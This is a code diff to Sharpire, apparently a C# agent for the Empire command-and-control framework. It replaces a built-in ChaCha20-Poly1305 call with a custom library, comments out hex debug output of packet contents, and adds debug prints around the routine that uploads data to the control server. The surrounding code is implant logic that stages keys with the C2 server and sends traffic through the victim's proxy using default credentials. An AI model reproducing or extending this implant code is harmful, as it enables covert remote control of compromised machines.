@@ -4,12 +4,11 @@ using System.Management;
 using System.Management.Automation.Runspaces;
 using System.Net;
 using System.Diagnostics;
-using System.Security.Cryptography.ChaCha20Poly1305;
 using System.Security.Cryptography;
 using System.Security.Principal;
 using System.Text;
 using System.Numerics;
-
+using ChaChaEncryption;
 
 namespace Sharpire
 {
@@ -209,9 +208,7 @@ namespace Sharpire
             byte[] poly1305_tag = new byte[16];
             byte[] chacha_data = new byte[data.Length];
 
-            // CURRENTLY HAVING ISSUES WITH THIS !!!
-            ChaCha20Poly1305 chacha = new ChaCha20Poly1305(key);
-            chacha.Encrypt(chacha_nonce, data, chacha_data, poly1305_tag, associatedData: null);
+            ChaCha20Poly1305.Encrypt(key, chacha_nonce, data, out chacha_data, out poly1305_tag);
 
             byte[] chacha_poly1305_data = Misc.combine(chacha_data, poly1305_tag);
             byte[] routingPacketData = Misc.combine(chacha_nonce, chacha_poly1305_data);
@@ -220,12 +217,12 @@ namespace Sharpire
                 routingPacketData = Misc.combine(routingPacketData, encryptedBytes);
             }
 
-            Console.WriteLine($"Chacha nonce: (Length: {chacha_nonce.Length}): {Convert.ToHexString(chacha_nonce)}");
-            Console.WriteLine($"Chacha data: (Length: {chacha_data.Length}): {Convert.ToHexString(chacha_data)}");
-            Console.WriteLine($"Poly 1305 tag: (Length: {poly1305_tag.Length}): {Convert.ToHexString(poly1305_tag)}");
-            Console.WriteLine($"Chacha poly1305 data: (Length: {chacha_poly1305_data.Length}): {Convert.ToHexString(chacha_poly1305_data)}");
-            Console.WriteLine($"Encrypted bytes: (Length: {encryptedBytes.Length}): {Convert.ToHexString(encryptedBytes)}");
-            Console.WriteLine($"Final packet: (Length: {routingPacketData.Length}): {Convert.ToHexString(routingPacketData)}");
+            // Console.WriteLine($"Chacha nonce: (Length: {chacha_nonce.Length}): {Convert.ToHexString(chacha_nonce)}");
+            // Console.WriteLine($"Chacha data: (Length: {chacha_data.Length}): {Convert.ToHexString(chacha_data)}");
+            // Console.WriteLine($"Poly 1305 tag: (Length: {poly1305_tag.Length}): {Convert.ToHexString(poly1305_tag)}");
+            // Console.WriteLine($"Chacha poly1305 data: (Length: {chacha_poly1305_data.Length}): {Convert.ToHexString(chacha_poly1305_data)}");
+            // Console.WriteLine($"Encrypted bytes: (Length: {encryptedBytes.Length}): {Convert.ToHexString(encryptedBytes)}");
+            // Console.WriteLine($"Final packet: (Length: {routingPacketData.Length}): {Convert.ToHexString(routingPacketData)}");
 
             return routingPacketData;
         }
@@ -258,7 +255,6 @@ namespace Sharpire
         {
             DiffieHellman dh = new DiffieHellman(); // Step 1: Create DH key pair
             byte[] publicKeyBytes = dh.PublicKeyBytes;
-            
             byte[] hmacData = AesEncryptThenHmac(stagingKeyBytes, publicKeyBytes);
 
             byte[] routingPacket = BuildRoutingPacket(stagingKeyBytes, "00000000", 2, hmacData);
@@ -308,11 +304,7 @@ namespace Sharpire
                 byte[] poly1305Tag = routingChachaData.Skip(16).Take(16).ToArray();
 
                 byte[] routingData = new byte[16];
-                // Strip tag + decrypt
-                using (var chacha = new ChaCha20Poly1305(key))
-                {
-                    chacha.Decrypt(chachaNonce, chachaData, poly1305, routingData, associatedData: null);
-                }
+                ChaCha20Poly1305.Decrypt(key, chachaNonce, chachaData, poly1305Tag, out routingData);
 
                 // parse routing data
                 if (routingData.Length < 16)
@@ -390,7 +382,9 @@ namespace Sharpire
                 webClient.Headers.Add("User-Agent", sessionInfo.GetStagerUserAgent());
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
+                Console.WriteLine("the error is here!!!");      // !!!
                 response = webClient.UploadData(sessionInfo.GetControlServers().First() + uri, "POST", data);
+                Console.WriteLine("test 3");                    // !!!
             }
 
             return response;
